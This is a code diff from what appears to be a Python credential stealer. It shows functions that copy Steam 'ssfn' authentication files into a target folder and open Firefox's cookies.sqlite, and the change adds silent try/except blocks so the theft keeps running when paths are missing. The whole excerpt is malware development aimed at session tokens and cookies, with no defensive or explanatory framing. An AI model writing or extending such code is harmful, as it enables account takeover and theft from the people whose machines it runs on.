@@ -136,15 +136,21 @@ def get_discord_info(discord_path, target_path):
 def get_steam_info(target_path):
     steam_path = r"C:\Program Files (x86)\Steam"
 
-    for file in os.listdir(steam_path):
-        if file.startswith("ssfn"):
-            with open(f"{target_path}/"+generate_file_name(), "a") as output, open(steam_path + "\\" + file, "rb") as steam_info:
-                output.write(steam_info.read().hex())
+    try:
+        for file in os.listdir(steam_path):
+            if file.startswith("ssfn"):
+                with open(f"{target_path}/"+generate_file_name(), "a") as output, open(steam_path + "\\" + file, "rb") as steam_info:
+                    output.write(steam_info.read().hex())
+    except:
+        pass
 
 def get_ff_info(username, target_path):
 
     firefox_path = rf"C:\Users\{username}\AppData\Roaming\Mozilla\Firefox\Profiles"
-    firefox_path = firefox_path + "\\" + os.listdir(firefox_path)[0]
+    try:
+        firefox_path = firefox_path + "\\" + os.listdir(firefox_path)[0]
+    except:
+        return
 
     try:
         with open(rf"{firefox_path}\cookies.sqlite", "rb") as cookies:
